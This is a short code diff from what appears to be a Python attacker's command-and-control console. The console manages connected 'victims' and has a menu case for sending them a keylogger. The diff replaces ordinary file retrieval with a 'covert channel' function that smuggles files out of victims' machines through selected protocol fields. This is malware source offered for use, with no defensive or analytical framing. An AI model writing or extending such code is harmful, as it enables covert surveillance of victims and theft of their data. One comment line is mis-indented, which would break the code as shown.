@@ -138,7 +138,9 @@ if __name__ == '__main__':
                             pass
                             # return None
                         else:
-                            receive_file(client_socket, client_ip, client_port)
+                            choices = protocol_and_field_selector()  # => For covert channel
+                            receive_file_covert(client_socket, client_ip, client_port,
+                                                source_ip, source_port, choices)
 
                     # CASE 3: Send keylogger to any specific connected victim
                     elif len(connected_clients) != constants.ZERO:
@@ -161,13 +163,15 @@ if __name__ == '__main__':
                             pass
                             # return None
                         elif target_socket:
-                            receive_file(target_socket, target_ip, target_port)
+                            choices = protocol_and_field_selector()  # => For covert channel
+                            receive_file_covert(target_socket, target_ip, target_port,
+                                                source_ip, source_port, choices)
                         else:
                             print(constants.TARGET_VICTIM_NOT_FOUND)
                             print(constants.RETURN_MAIN_MENU_MSG)
                             print(constants.MENU_CLOSING_BANNER)
 
-                # MENU ITEM 9 - Watch File
+# MENU ITEM 9 - Watch File
                 if command == constants.PERFORM_MENU_ITEM_NINE:
                     global_thread = perform_menu_item_9(connected_clients, global_thread, signal_queue)
 
